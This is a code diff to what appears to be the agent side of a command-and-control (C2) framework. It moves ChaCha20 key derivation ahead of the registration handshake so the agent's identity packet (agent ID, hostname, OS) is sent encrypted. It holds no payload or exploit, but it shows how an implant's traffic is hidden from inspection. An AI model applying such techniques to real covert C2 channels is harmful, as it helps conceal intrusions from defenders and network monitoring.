@@ -117,16 +117,19 @@ class AgentClient:
         self._reader = PacketReader()
         if self._on_packet is not None and hasattr(self._on_packet, "reset"):
             self._on_packet.reset()
-        if not await self._handshake(reader, writer):
+        # Derive the ChaCha20 key before the handshake: after the challenge is
+        # verified, the (now encrypted) register_confirm is the first packet of
+        # the Agent -> C2 encrypted stream, so tx must be shared between the
+        # confirm and all subsequent Agent -> C2 traffic.
+        key = derive_key(self._auth_token)
+        tx = ChaCha20(key, NONCE_AGENT_TO_C2)
+        rx = ChaCha20(key, NONCE_C2_TO_AGENT)
+        if not await self._handshake(reader, writer, tx):
             logger.warning("registration handshake failed")
             writer.close()
             self._writer = None
             return
-        # Handshake + auth succeeded: switch the whole byte stream to
-        # ChaCha20 encryption keyed by sha256(auth_token).
-        key = derive_key(self._auth_token)
-        tx = ChaCha20(key, NONCE_AGENT_TO_C2)
-        rx = ChaCha20(key, NONCE_C2_TO_AGENT)
+        # Handshake + auth succeeded: the whole byte stream is now encrypted.
         stream = EncryptedStream(reader, writer, tx, rx)
         self._stream = stream
         stream.absorb_leftover(self._reader)
@@ -162,7 +165,7 @@ class AgentClient:
             self._writer = None
             self._stream = None
 
-    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
+    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, tx: ChaCha20) -> bool:
         """Challenge-response registration with the C2.
 
         Sends a ``register`` packet carrying ONLY a random nonce (no agent id /
@@ -170,7 +173,9 @@ class AgentClient:
         Receives the C2's ``sha256(nonce + c2_auth_tokens)`` challenge, verifies
         it against the locally stored token, and only after verification sends
         ``register_confirm`` now carrying the identity fields
-        (agent_id, hostname, os). Returns False (and disconnects) on any
+        (agent_id, hostname, os). The confirm packet is ENCRYPTED with ``tx``
+        (the first packet of the Agent -> C2 ChaCha20 stream), so the identity
+        never travels in plaintext. Returns False (and disconnects) on any
         verification failure.
         """
         nonce = secrets.token_hex(16)
@@ -196,7 +201,7 @@ class AgentClient:
             req_id, CMD_REGISTER_CONFIRM, [self._agent_id, hostname, os_name]
         )
         async with self._write_lock:
-            writer.write(pkt)
+            writer.write(tx.crypt(pkt))
             await writer.drain()
         return True
 
